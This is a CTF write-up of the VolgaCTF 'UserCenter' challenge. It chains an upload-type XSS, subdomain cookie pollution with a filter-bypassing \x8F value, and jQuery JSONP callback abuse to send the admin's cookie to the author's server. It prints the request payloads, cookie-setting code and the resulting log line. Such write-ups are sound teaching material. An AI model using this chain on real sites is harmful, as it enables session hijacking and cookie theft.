---
title:  "VolgaCTF Qualifiers - UserCenter Web Challenge"
date:   2020-03-29
categories: CTF web challenge XSS jquery
---



During the weekend, I wanted to spend some time brushing up my web appsec skills and decided it would be a good idea to try some CTF challenges. One of the interesting CTFs that was running this weekend was VolgaCTF so I decided to give it a go. 

There were several interesting challenges but my favourite was ```UserCenter```. The description of it was ```Steal admin's cookie```  giving a clue that the type of vulnerability may be an XSS.

Getting familiar with the portal, there were 2 main functionalities that could be abused to trigger an XSS: 
1. Report Bug - Allowed to send specific URLs to the administrator. (May be useful for XSS that require user interaction)
2. Edit Profile - Allows to edit the Bio and Avatar. (Good target for XSS)

The request that was updating the profile contained the base64 encoded content and the MIME type of the uploaded file:
```json
POST /user-update HTTP/1.1
Host: api.volgactf-task.ru
User-Agent: Mozilla/5.0 () Gecko/20100101 Firefox/74.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 809
Origin: https://volgactf-task.ru
Connection: close
Referer: https://volgactf-task.ru/editprofile.html
Cookie: PHPSESSID=[SNIPPED]

{"avatar":"QUFBQQ==","type":"text/plain","bio":"No BIO"}

```
If the edit was successful, the file was uploaded to the ```static``` subdomain. 
The plan was to upload a file that could allow me to trigger the XSS like a HTML file but it wasn't as straight forward.

## Triggering the XSS

Trying to upload a html file the request failed with the ```Forbidden MIME type``` error. Since the html file was blocked,
I tried uploading an SVG (Scalable Vector Graphics) file to trigger the XSS.
This failed as well since any content type containing xml/html was getting blocked. 

After doing more research on possible content types I could abuse, I decided to try ```*/*``` and see what would happen.

The file was successfully uploaded as was indicated by the response below:
```json
POST /user-update HTTP/1.1
Host: api.volgactf-task.ru
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 93
Origin: https://volgactf-task.ru
Connection: close
Referer: https://volgactf-task.ru/editprofile.html

{"avatar":"PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+","type":"*/*","bio":"No Bio"}

HTTP/1.1 200 OK
Server: nginx/1.16.1 (Ubuntu)
Date: Sun, 29 Mar 2020 18:45:19 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://volgactf-task.ru
Content-Length: 16

{"success":true}
```

Even though the file was uploaded successfully, it was still unknow how Firefox would parse this file type. 

To my suprise, Firefox parsed it as a HTML even that the ```X-Content-Type-Options``` header was set to nosniff allowing the execution of arbritary javascript on the ```static.volgactf-task.ru``` .

![](/images/volgactf-xss.png)

## Cross-Domain Cookie Pollution

At this point, I decided to build a cookie stealing payload and send it to the admin using the report bug feature. I wasn't expecting it to work as it was too simple to be true.

I received the request, indicating the XSS was triggered but there was no cookie. At that point I assumed that the cookie was not on the ```static.volgactf-task.ru``` but on the main domain.

With this information, I decided to poke around the web application more and see if the thing we achieved could be useful in abusing or finding any other vulnerability.

On ```main.js``` the following part of code was really interesting:

```js
 $(document).ready(function() {
  api = 'api';
  if(Cookies.get('api_server')) {
    api = replaceForbiden(Cookies.get('api_server'));
  } else {
    Cookies.set('api_server', api, {secure: true});
  }
```

When the web page was loaded, it was getting the ```api_server``` cookie value which by default was ```api```. This cookie was pretty important as it defined the subdomain hostname where most of the requests get sent.
For example, the user details our downloaded from the API:
```js
    $.getJSON(`//${api}.volgactf-task.ru/user`, function(data) {
      if(!data.success) {
        location.replace('/login.html');
      } else {
        profile(data.user, true);
      }
```
Having control over the api variable (initialized by the api_server cookie) means that we can trick to send the requests on one of our controlled hosts. To bypass the subdomain restriction, you could specify the following value on the api_server cookie : ```test.com/```
When used on the code, it would turn to ```//test.com/.volgactf-task.ru/user```, sending the requests to our test.com server.

### Bypassing the Filter

If you paid attention to the code snippet that was setting the api_server cookie, it passed the value through the ```replaceForbiden``` function. This function would remove all the characters that could be used to break out of the subdomain restriction mentioned earlier.

```js
function replaceForbiden(str) {
  return str.replace(/[ !"#$%&Вґ()*+,\-\/:;<=>?@\[\\\]^_`{|}~]/g,'').replace(/[^\x00-\x7F]/g, '?');
}
```

This filter could be bypassed easily by providing the following value: ```"test.com\x8F"``` .
The last part of the filter would replace any character that wasn't on the [^\x00-\x7F] range with a ?.
When passing the above value, the URL would become ```test.com?.volgactf-task.ru/user``` giving us full control over the hostname the requests are sent.

### Doing the Cookie Pollution

Since I already had javascript execution on a subdomain, I could create a new cookie and define my own API server. 
The domain attribute of this cookie would be ```.volgactf-task.ru``` meaning that it would be set for all the subdomains including the main domain.
To demonstrate if this was possible I executed the following command from the ```static.volgactf-task.ru``` domain context:

```js
document.cookie = "api_server=test.com\x8F; session=True; path=/profile.html ;domain=volgactf-task.ru; hostOnly=True";
```

Running ```Cookies.get("api_server")``` on the main domain confirms the cookie was polluted and the API domain contains our own host:

![](/images/volgactf-polluted.png)

## JQuery and JSONP 

Having control of so parts of the application but no straight way to turn this on an XSS. I tried several things that failed which I'm not going to describe here as this blogpost is long enough. After considerable time poking around and failing, I decided to research for any functions I could abuse to turn the data returned from the api on an XSS.

I discovered the following issue on Github:

![](/images/volgactf-issue.png)

The issue described that if you have control over the URL passed to JQuery getJson function, you could trick it in executing arbritary javascript. This function was heavily used on the application and I had control over the URL since we polluted the api_server cookie.

To verify the theory, I hosted the following js file : ```({"pwn":""+alert(document.domain)});``` and called getJson by specifying  jsoncallback=? in the URL.

```js
$.getJSON("https://example.com/test.js?jsoncallback=?",function(data) {console.log(data)})
```
XSS was triggered successfully.

With this information, the attack to steal the administrator cookie was as following:

1. Upload XSS payload on static.volgactf-task.ru.
2. Hijack the api_server cookie.
3. Trigger a call to getJson and respond with cookie stealing javascript code.

Another problem was that I had partial control on the URL because of the filtering in place. To trigger the XSS I had to specify the jsoncallback parameter, which at the current situation wasn't possible.
I decided to further investigate the code and see if there was any place where I could control the END of the URL and I discovered the following code:

```js
function getUser(guid) {
  if(guid) {
    $.getJSON(`//${api}.volgactf-task.ru/user?guid=${guid}`, function(data) {
      if(!data.success) {
        location.replace('/profile.html');
      } else {
        profile(data.user);
      }
    });
  } 
  ```

The guid variable was initialized on page load from a GET parameter passed on the URL:

```js
params = new URLSearchParams(location.search);

if(['/','/index.html','/profile.html','/report.php','/editprofile.html'].includes(location.pathname)) {
  getUser(params.get('guid'));
}
```
Having control over the guid parameter, I could set its value to ```&jsoncallback=?``` and JQuery would parse the response as javascript.

Having all the missing pieces of the puzzle, the following steps were used to complete the challenge:

1. Upload the XSS payload on the static subdomain.
2. Hijack the api_server cookie with the ```api_server=test.com\x8F``` value.
3. Redirect to ```https://volgactf-task.ru/profile.html?guid=%26jsoncallback%3D%3F```
4. The .getJson function would be called with the following URL :  ```https://test.com/?.volgactf-task.ru/user?guid=&jsoncallback=?```
5. The controlled server would return the cookie stealing payload and send it to my server.

Following the above steps, I received the flag on my web server logs , successfully completing the challenge:

```	
128.199.62.109 - - [28/Mar/2020:21:51:24 +0000] "GET /VOLGACTF/api_server=test.com%C2%8F;%20flag=VolgaCTF_0558a4ad10f09c6b40da51c8ad044e16 HTTP/1.1" 404 152 "https://volgactf-task.ru/profile.html?guid=%26jsoncallback%3D%3F" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0"
```
